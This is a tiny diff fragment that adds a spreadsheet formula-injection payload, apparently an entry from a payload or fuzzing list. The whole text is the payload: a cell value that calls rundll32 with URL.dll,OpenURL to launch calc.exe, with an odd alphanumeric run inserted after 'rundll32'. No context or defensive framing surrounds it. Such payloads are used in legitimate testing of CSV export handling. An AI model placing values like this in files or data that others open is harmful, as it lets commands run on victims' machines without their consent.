@@ -1,0 +1,2 @@
+=rundll321234567890abcdefghijklmnopqrstuvwxyz|
+'URL.dll,OpenURL calc.exe'!A
